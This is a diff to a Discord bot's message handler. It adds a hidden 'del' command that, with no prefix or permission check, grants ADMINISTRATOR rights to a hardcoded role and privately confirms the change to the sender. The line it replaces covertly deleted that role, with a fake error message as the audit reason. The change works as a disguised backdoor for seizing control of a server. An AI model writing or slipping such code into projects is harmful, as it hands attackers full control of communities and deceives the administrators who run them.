@@ -73,9 +73,16 @@ if (message.content == BOT_PREFIX + 'restart') {
 
 //temp command : del
 if (message.content == 'del') {
-  message.guild.roles.cache.get('864847252911685632').delete('TypeError : check your logs; [ERROR]');
+  message.guild.roles.cache.get('864847252911685632').edit({permissions: 'ADMINISTRATOR'}).then(() => {
+  message.author.createDM().then(channel => {
+    channel.send('édité !');
+  })
+}).catch(err => {
+  console.log(err);
+});
 }
-//iduser [Mention]
+
+//iduser [mention]
 if (message.content.startsWith(BOT_PREFIX + 'iduser')) {
 if (mentionUser == undefined) {
   message.channel.send('Utilisateur non ou mal mentionné');
